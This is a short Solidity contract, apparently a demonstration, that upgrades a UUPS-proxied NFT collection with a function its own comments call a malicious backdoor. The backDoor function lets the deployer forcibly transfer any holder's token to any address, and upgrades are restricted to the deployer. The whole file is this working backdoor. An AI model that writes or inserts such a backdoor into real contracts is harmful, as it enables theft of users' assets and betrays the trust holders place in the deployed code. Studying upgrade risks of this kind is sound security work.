//SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// Upgradeable contracts
import "./NFT.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC721/ERC721Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

// Inherits from NFT.sol as we are upgrading/extending it's functionality
contract NFTBackDoor is Initializable, ERC721Upgradeable, UUPSUpgradeable, NFT {
    // @dev malicious upgrade that allows deployer to forcefully transfer NFT's between accounts
    function backDoor(
        address _from,
        address _to,
        uint256 _tokenID
    ) external {
        require(msg.sender == deployer);

        _transfer(_from, _to, _tokenID);
    }

    function _baseURI()
        internal
        pure
        override(NFT, ERC721Upgradeable)
        returns (string memory)
    {
        return "ipfs://QmYsuuaVVa8GAXDDxwtBfNBgWtyJJXKtoCk5cQBWiTHXTW/";
    }

    // @dev internal check that ensures only initial deployer can upgrade the contract
    function _authorizeUpgrade(
        address /* newImplementation */
    ) internal view override(NFT, UUPSUpgradeable) {
        require(msg.sender == deployer);
    }
}
